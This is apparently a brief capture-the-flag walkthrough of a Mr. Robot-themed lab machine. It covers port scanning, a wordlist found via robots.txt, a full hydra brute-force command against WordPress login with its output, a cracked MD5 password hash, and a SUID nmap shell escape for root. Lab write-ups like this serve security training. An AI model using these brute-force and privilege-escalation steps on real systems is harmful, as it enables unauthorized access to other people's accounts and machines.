start with nmap scan.


http is open on port 80.
https Is open on port 443

***
web page.

fuff the page.

/admin found

in robots.txt we get two files.

```
fsocity.dic
key-1-of-3.txt

```

fsocity.dic is may be wordlist and we have to bruteforce the pw andusername.


in key-1-of-3.txt found first key : 073403c8a58a1f80d943455fb30724b9


***

wordpress site found while visiting : http://10.10.52.237/admin/login.html

it has login page on http://10.10.52.237/wp-login.php

lets use the fsocity.dic for bruteforcing creds. use wpscan to bruteforce.

Using hydra we get username : Elliot

```
hydra -L fsocity.dic -p test $ip https-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.52.237%2Fwp-admin%2F&testcookie=1:Invalid username."
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-20 03:26:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-forms://10.10.52.237:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.52.237%2Fwp-admin%2F&testcookie=1:Invalid username.
[443][http-post-form] host: 10.10.52.237   login: Elliot   password: test


```

password : ER28-0652

got rever shell.

in robot uses home directory found a file. `password.raw-md5` which has md5 hash password of user `robot`

`robot:c3fcd3d76192e4007dfb496cca67e13b`

lets crack the passwrod.

`robot:abcdefghijklmnopqrstuvwxyz`


***

privs : suid bit set to /usr/local/bin/nmap


```
nmap --interactive
nmap> !sh

```